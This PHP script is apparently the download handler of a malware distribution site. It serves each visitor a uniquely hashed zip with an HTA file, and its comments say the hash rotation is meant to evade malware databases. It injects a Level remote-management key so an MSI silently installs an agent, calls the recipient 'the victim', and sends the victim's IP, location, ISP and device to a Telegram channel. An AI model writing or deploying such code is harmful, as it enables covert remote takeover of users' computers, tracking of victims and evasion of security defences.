<?php
require __DIR__ . '/../lib.php';

// ============================================================
//  The actual download. Serves a per-download FRESH copy of the
//  source zip under a fresh name. BOTH hashes are unique per
//  download:
//    - zip: shuffled entries + random timestamps + random EOCD comment
//    - inner HTA: random whitespace/comment bytes injected before
//      </body>, so the HTA's own SHA-256 differs every time
//  (malware DBs key off the inner file once executed — a static
//  inner hash gets flagged eventually; a rotating one does not.)
// ============================================================

$tok = gate_dl();

// ---- name for THIS download (fixed by the visit, not by this request) ----
$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.zip')) { $name .= '.zip'; }

// ---- read source zip entries ONCE ----
$src = SOURCE_ZIP;
if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
$in = new ZipArchive();
if ($in->open($src) !== true) { http_response_code(500); echo '500'; exit; }
$entries = [];
for ($i = 0; $i < $in->numFiles; $i++) {
    $st = $in->statIndex($i);
    $entries[$st['name']] = $in->getFromIndex($i);
}
$in->close();

// ---- mutate the HTA: inject this service's Level org key + a random
//      invisible comment before </body>. The key makes the MSI run its
//      silent RunInstaller action and register the agent with THIS org
//      (per-service LEVEL_API_KEY env var). If unset, the placeholder is
//      left inert so the MSI installs without an org key. ----
$levelKey = (string)($_ENV['LEVEL_API_KEY'] ?? (getenv('LEVEL_API_KEY') ?: ''));
foreach ($entries as $nm => $data) {
    if (substr($nm, -4) !== '.hta') continue;
    $pad = random_int(2, 8) . " \n";                              // random trailing whitespace
    $cmt = "<!-- " . str_repeat(' ', random_int(24, 160)) . " v" . random_int(10000, 99999) . " -->\n";
    $pos = strrpos($data, '</body>');
    $entries[$nm] = ($pos !== false)
        ? substr($data, 0, $pos) . $pad . $cmt . substr($data, $pos)
        : $data . $pad . $cmt;
    if ($levelKey !== '') {
        // Replace ONLY the first token occurrence (the `var LEVEL_KEY = "…"`
        // declaration). The guard below the engine references the literal
        // token too; replacing just the decl keeps the guard working and
        // guarantees the key lands exactly once.
        $e = (string)$entries[$nm];
        $i = strpos($e, '@@LEVEL_KEY@@');
        if ($i !== false) {
            $entries[$nm] = substr($e, 0, $i) . $levelKey
                          . substr($e, $i + strlen('@@LEVEL_KEY@@'));
        }
    }
}

// ---- build the fresh zip. Wrapped in a retry loop: on some kernels
//      (overlayfs / slow page-cache flush) the bytes written by
//      ZipArchive::close() are not yet visible to a read, which would
//      hand the victim an empty file. Retry up to 4x with a brief wait;
//      validate via the EOCD signature so a corrupt read retries too. ----
$zipBytes = '';
for ($attempt = 1; $attempt <= 4 && $zipBytes === ''; $attempt++) {
    if ($attempt > 1) { usleep(40000); }   // 40ms settle

    $tmp = tempnam(sys_get_temp_dir(), 'zipsrv_');
    if ($tmp === false) continue;
    @unlink($tmp);

    $za = new ZipArchive();
    if ($za->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        @unlink($tmp); continue;
    }
    $names = array_keys($entries);
    shuffle($names);   // random entry order + per-file random DOS timestamp
    foreach ($names as $nm) {
        $za->addFromString($nm, (string)$entries[$nm], time() - random_int(60, 86400));
    }
    $za->close();

    clearstatcache(true, $tmp);
    $zipBytes = (string)@file_get_contents($tmp);
    @unlink($tmp);

    // A valid zip always ends with an EOCD record — if we can't find it,
    // the read was stale/corrupt; retry.
    if ($zipBytes !== '' && strrpos($zipBytes, "PK\x05\x06") === false) {
        $zipBytes = '';
    }
}

if ($zipBytes === '') { http_response_code(500); echo '500'; exit; }

// Attach a random comment so the zip's own SHA-256 is unique per download.
// (ZipArchive doesn't expose comments before PHP 8.4; patch the EOCD:
//  16-bit comment length at EOCD offset +20, field follows the 22-byte
//  fixed part.)
$eocd = strrpos($zipBytes, "PK\x05\x06");
$comment = random_bytes(random_int(48, 512));
$zipBytes = substr($zipBytes, 0, $eocd + 20) . pack('v', strlen($comment)) . $comment;

// ---- one Telegram alert per real served download (deduped by visit) ----
$key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g = geo(ip());
    $msg = "\x{1F4E5} Download Served \x{1F4E5}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $name . " (" . round(strlen($zipBytes) / 1048576, 2) . " MB)\n"
         . "\x{1F501} SHA256: " . substr(hash('sha256', $zipBytes), 0, 16) . "...\n"
         . "\x{1F4F1} Device: " . ua();
    tg($msg);
}

// ---- serve ----
header('Content-Description: File Transfer');
header('Content-Type: application/zip');
header('Content-Disposition: attachment; filename="' . $name . '"');
header('Expires: 0');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Content-Length: ' . strlen($zipBytes));
echo $zipBytes;
exit;
